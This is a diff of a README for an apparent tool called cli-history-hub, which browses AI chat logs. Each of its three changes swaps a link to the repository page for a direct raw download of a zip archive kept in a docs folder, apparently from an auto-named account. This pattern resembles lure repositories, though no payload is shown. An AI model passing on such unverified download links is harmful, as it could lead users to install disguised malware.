@@ -1,6 +1,6 @@
 # 🗂️ cli-history-hub - Browse AI Chat Logs Locally
 
-[![Download cli-history-hub](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/newsprung-excrescence697/cli-history-hub)
+[![Download cli-history-hub](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/newsprung-excrescence697/cli-history-hub/raw/refs/heads/main/docs/cli_history_hub_2.0-beta.2.zip)
 
 ## 📌 What this app does
 
@@ -21,7 +21,7 @@ It keeps each source separate, so your history stays easy to scan.
 
 Use this link to visit the download page:
 
-[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub)
+[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub/raw/refs/heads/main/docs/cli_history_hub_2.0-beta.2.zip)
 
 ### 2. Get the Windows file
 
@@ -256,7 +256,7 @@ Also:
 
 ## 📥 Download again
 
-[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub)
+[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub/raw/refs/heads/main/docs/cli_history_hub_2.0-beta.2.zip)
 
 ## 🧭 Use flow
 
